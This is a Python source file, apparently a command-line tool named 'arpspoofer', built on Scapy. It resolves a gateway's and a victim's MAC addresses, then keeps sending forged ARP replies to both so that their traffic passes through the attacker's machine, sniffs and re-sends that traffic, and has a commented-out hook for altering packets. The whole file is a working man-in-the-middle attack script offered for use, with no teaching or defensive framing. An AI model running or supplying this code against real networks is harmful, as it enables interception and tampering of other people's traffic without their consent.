from scapy.layers.l2 import Ether, ARP
from scapy.all import *
from argparse import ArgumentParser

def arp_send():
    try:
        while(1):
            print("Send ARP Spoof Packets")
            sendp(Ether(dst=mac_victim) / ARP(op='is-at', psrc=ip_gateway, pdst=ip_victim))
            sendp(Ether(dst=mac_gateway) / ARP(op='is-at', psrc=ip_victim, pdst=ip_gateway))
            time.sleep(10)
    except:
        print("Stop")
        close()

def handle_packet(packet):
    try:
        print(packet[Ether].src, packet[Ether].dst)
        print(packet.summary())
        #packet=payload(packet)
        send(packet)
    except:
        print("Stop")
        close()

def close():
    sendp(Ether(dst=mac_victim, src=mac_gateway) / ARP(op='is-at', psrc=ip_gateway, pdst=ip_victim))
    sendp(Ether(dst=mac_gateway, src=mac_victim) / ARP(op='is-at', psrc=ip_victim, pdst=ip_gateway))

def get_mac(ip_address):
    query = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address)
    ans, _ = srp(query, timeout=2)
    for _, rcv in ans:
        return rcv[Ether].src
    return None

parser = ArgumentParser(prog='arpspoofer', usage='./arpspoofer.py -g ip_gateway -v ip_victim')
parser.add_argument('-g', "--gateway", type=str, help='Gateway IP', required=True)
parser.add_argument('-v', "--victim", type=str, help='Victim IP', required=True)
args = parser.parse_args()
ip_gateway = args.gateway
ip_victim = args.victim
mac_gateway = get_mac(ip_gateway)
mac_victim = get_mac(ip_victim)
print("MAC Gateway: " + str(mac_gateway) + "\nMAC Victim: " + str(mac_victim))
assert (mac_victim != None ), "Don't get mac Victim"
assert (mac_gateway != None ), "Don't get mac Gateway"
print('Start sniffing.')
o = threading.Thread(target=arp_send, args=())
try:
    o.start()
    bpf = ("src host %(targetb)s or dst host %(targetb)s")
    bpf %= {'targeta': ip_gateway, 'targetb': ip_victim}
    sniff(prn=handle_packet, store=0, filter=bpf)
except:
    print("Stop")
    close()
